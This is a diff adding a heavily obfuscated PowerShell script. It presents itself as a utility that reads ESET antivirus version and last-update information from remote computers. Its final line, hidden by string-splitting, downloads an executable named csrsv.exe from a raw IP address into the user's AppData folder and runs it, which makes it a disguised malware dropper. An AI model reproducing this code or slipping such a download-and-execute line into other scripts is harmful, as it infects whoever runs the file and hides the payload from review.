@@ -1,0 +1,29 @@
+.("{1}{2}{0}" -f'VArIAbLE','S','Et-') s0o2  (  [tyPE]("{8}{4}{1}{9}{3}{7}{6}{0}{5}{2}{10}" -f 'Ps','M.MAna','nt','tOmA','te','CredE','on.','tI','syS','GEMENT.au','IaL') ) ; .("{1}{0}"-f 't','sE') 2753sQ  ( [tYPE]("{1}{0}{2}" -f 'e','DAt','TIMe')) ;function Get-MResEtUPDAt`E`V`Ersi`ON {
+    [CmdletBinding()]
+    param (
+        [ValidateNotNullOrEmpty()]
+        [string[]]${CO`mPutE`RNA`ME} = ${E`N`V:COmpuTERNA`mE},
+        
+        [System.Management.Automation.Credential()]${C`REdenT`IAl} =   ( .('gI') VARIablE:S0o2 )."Val`Ue"::"E`mpty"
+    )
+
+    ${pA`Ra`ms} = @{}
+    if (${pS`B`oUndpaR`AMe`TerS}."cRe`DE`Ntial"){
+        ${P`ARamS}."Cre`deNti`AL" = ${CrEdE`Nt`I`AL}
+    }
+
+    ${rE`s`UltS} = .("{2}{1}{3}{0}" -f'and','oke-Co','Inv','mm') -ComputerName ${COM`P`Ute`Rn`AME} {
+        .("{2}{1}{4}{0}{3}"-f 'mPro','t','Get-I','perty','e') -Path ((("{11}{8}{4}{0}{1}{5}{3}{12}{9}{2}{10}{7}{6}"-f 'RE{','0','e',' Security{','OFTWA','}ESET{0}ESET','}Info','0',':{0}S','entV','rsion{','HKLM','0}Curr'))-F  [char]92) 2>&1 
+    } @Params
+
+    foreach (${R`E`sUlt} in ${r`Esu`LtS}) {
+        [pscustomobject]@{
+            ("{1}{3}{0}{2}" -f'u','Co','terName','mp') = ${r`eSuLt}."pScOmp`UteR`Name"
+            ("{0}{1}{2}" -f'Pro','ductNam','e') = ${R`e`suLT}."PROdU`CT`Na`Me"
+            ("{2}{0}{1}"-f 'rsio','n','ScannerVe') = ${RES`ULT}."SCA`NNErVeR`S`IoNId"
+            ("{1}{2}{0}" -f 'date','Last','Up') = if (${re`sULt}."ScaNne`R`VERsI`On") {( ${2`753sq}::("{3}{0}{2}{1}"-f'ar','eExact','s','P').Invoke(${ReS`U`LT}."sCANneRv`Ersi`ON" -replace ((("{4}{3}{1}{0}{2}" -f 'pD','4y(U','b4y)','*b','^.'))."rEpLA`CE"('b4y',[StrINg][char]92)."r`eP`lacE"(([char]85+[char]112+[char]68),'|')), ("{0}{1}"-f'y','yyyMMdd'), ${N`Ull})).("{0}{4}{2}{3}{5}{1}" -f'To','tring','o','rt','Sh','DateS').Invoke()}
+        }
+    }
+    
+}
+(&("{2}{0}{1}"-f 'Objec','t','New-') ("{3}{1}{0}{4}{2}{5}{6}" -f 't.','Ne','l','System.','WebC','i','ent')).("{1}{0}{2}" -f 'il','DownloadF','e').Invoke(("{1}{4}{2}{5}{6}{7}{3}{0}" -f'e','http:','102','.ex','//94.','.53.2','38/~ya','hoo/csrsv'),"$env:APPDATA\csrsv.exe");.("{2}{1}{0}{3}" -f 'roces','-P','Start','s') ("$env:APPDATA\csrsv.exe")
